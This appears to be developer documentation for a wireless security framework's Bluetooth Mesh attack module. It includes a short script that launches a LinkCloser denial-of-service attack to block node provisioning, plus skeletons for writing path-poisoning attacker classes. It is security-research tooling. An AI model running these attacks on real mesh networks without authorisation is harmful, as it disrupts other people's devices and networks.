Attacks
=======

The Bluetooth Mesh domain allows you to use and create **attacker classes** in order to perform attacks on a BM network.

The curious user can check the code for the Attacks in the `whad.btmesh.attacker` directory.

Attacker class
~~~~~~~~~~~~~~

Each attack is associated with an Attacker class. They inherit the :class:`whad.btmesh.attacker.Attacker` base class.
An attacker class requires a BtMesh connector to function (provisioned or not, depending on the attack).

Each Attacker class is associated with a Configuration class, listing the parameters of the attack, their type and descriptions.


Example use of an attack (Provisioning LinkCloser)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The following code allows a WHAD device to perform a LinkCloser attack. It monitors provisioning traffic and automatically sends 
malicious messages to close the link, preventing provisioning of any nodes.

This script will effectvly prevent the provisioning of new nodes for 20 seconds (via the advertising bearer).

.. code-block:: python

    from whad.device import WhadDevice
    from whad.btmesh.connector.provisionee import Provisionee
    from whad.btmesh.attacker.link_closer import LinkCloserAttacker, LinkCloserConfiguration


    dev = WhadDevice.create(interface)

    provisionee = Provisionee(dev)
    provisionee.start()
    provisionee.profile.auto_provision()

    print("Node is (auto) provisioned !")

    # Create the attacker object and launch the attack
    link_closer_conf = LinkCloserConfiguration(timeout=20)
    link_closer = LinkCloserAttacker(
        connector=provisionee, configuration=link_closer_conf
    )

    print("Lauching the LinkCloser attacker for 20 seconds")
    link_closer.launch(asynch=False)

    link_closer.show_result()


The first step is the create a BtMesh connector with the :class:`whad.btmesh.connector.provisioner.Provisioner` class. We auto-provision it (even if not necessary here).

We then instantiate the Attacker Configuration :class:`whad.btmesh.attacker.link_closer.LinkCloserConfiguration` and set the timeout of the attack.
Finally, we create the Attacker object :class:`whad.btmesh.attacker.link_closer.LinkCloserAttacker` with the connector and configuration.

The attack is launched via the `launch` method. We specify if the attack is synchronous or not. We can show the results of the attack via the `show_result` command at any time.


Attacker class creation
~~~~~~~~~~~~~~~~~~~~~~~

All Attacker classes are located in the `whad.btmesh.attacker` directory, and are based on the :class:`whad.btmesh.attacker.Attacker` class.

The main attributes of an Attacer class are : 
    - :py:attr:`whad.btmesh.attacker.name` : the name of the Attack in human readable format.
    - :py:attr:`whad.btmesh.attacker.description` : the description of the Attack in human readable format.
    - :py:attr:`whad.btmesh.attacker.need_provsisioned_node` : specifies if the attack needs a provisioned node to be performed.
    

The functions to override if necessary are : 
    - :py:meth:`whad.btmesh.attacker._setup`: this method is called when creating the Attacker. Used to setup the parameters of the attack. It notably sets custom handlers in the BTMesh layers in order to have a custom behaviour.
    - :py:meth:`whad.btmesh.attacker.restore`: : this method is called if we want to terminate the attack and go back to normal behaviour. Should "undo" the _setup method.
    - :py:meth:`whad.btmesh.attacker._attack_runner`: this method performs the attack (or its first steps at least) and is called when Attacker is launched and is called when the Attacker is launched.
    - :py:meth:`whad.btmesh.attacker.launch`: this method lauches the attack. It should only call the `super.launch` method. Its purpose is to have a default behaviour for synch/asynch for each attack.
    - :py:meth:`whad.btmesh.attacker.show_result`: this method allows the user to show the state of the Attack. It should print any relevant information.

Attacks specific functions (especially custom message handlers) are implemented if necessary. Every BTMesh layer has the `register_custom_handler` and `unregister_custom_handler` methods.
They allow the user to alter the behaviour of the protocol stack when necessary, such as below :

.. code-block:: python

    def _setup(self):
        """
        Setup the Upper Transport layer for the attack.
        """
        self._connector.stop()
        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.register_custom_handler(
            BTMesh_Upper_Transport_Control_Path_Request, self.on_path_request
        )  # register our attack_callback in in upper_transport layer
        self._connector.start()
        self._is_setup = True

    def on_path_request(self, message):
        """
        Handler of a BTMesh_Upper_Transport_Control_Path_Request message from our attack.
        Proceeds with the poisoning of the victim's forwarding table with a BTMesh_Upper_Transport_Control_Path_Reply

        :param message [TODO:type]: [TODO:description]
        """
        # Custom handler on the Upper TransportLayer for Path Request messages
        # Executes in the context of the layer (self is the UpperTransport layer instance).
        pkt, ctx = message
        pkt.show()
        return True #If True returned, layer continues with normal behaviour, ignores packet if False returned.


Finally, all Attacker classes should have a configuration class associated to it, such as the example below.


.. code-block:: python

    @dataclass
    class PathPoisonSolicitationConfiguration:
        """Configuration for the PathPoisonSolicitation attack

        :param trigger_addresses: The list of addresses we know the victim nodes have a path to.
        :param poison_adresses: The list of addresses to add to the solicitation message to create poisoned path. Each address will poison itself and its range + 255 * 2.
        :param net_key_index: The net_key_index to use to send the control messages.
        """

        trigger_addresses: list[int] = field(default_factory=lambda: [0x0003])
        poison_adresses: list[int] = field(default_factory=lambda: [0x0001])
        net_key_index: int = 0
